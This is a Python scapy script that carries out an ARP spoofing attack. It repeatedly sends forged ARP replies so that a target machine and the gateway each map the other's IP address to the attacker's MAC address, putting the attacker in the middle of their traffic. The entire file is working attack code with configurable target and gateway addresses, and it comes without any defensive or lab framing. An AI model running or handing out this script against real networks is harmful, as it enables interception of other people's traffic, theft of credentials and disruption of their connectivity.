import time
from scapy.all import *
from scapy.layers.l2 import ARP, Ether


def arp_spoof(target_ip, spoof_ip, interface='YOUR_INTERFACE'):
    # Get the MAC address of the target
    target_mac = get_mac(target_ip)

    # Create an ARP "is-at" packet to say spoof_ip is at my MAC address
    packet = Ether() / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    # Send the packet
    sendp(packet, iface=interface, verbose=False)


def get_mac(ip):
    # Send an ARP "who-has" request to get the MAC of ip
    response, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=2, retry=10, verbose=False)
    # Return the MAC address from the response
    for _, packet in response:
        return packet[Ether].src


# Use the IP addresses relevant to your network
target_ip = "192.168.1.5"
gateway_ip = "192.168.1.247"
interface = "Wi-Fi"

try:
    while True:
        # Tell the target that we are the gateway
        arp_spoof(target_ip, gateway_ip, interface)
        # Tell the gateway that we are the target
        arp_spoof(gateway_ip, target_ip, interface)
        # Sleep for a bit
        time.sleep(10)
except KeyboardInterrupt:
    print("ARP spoofing stopped.")
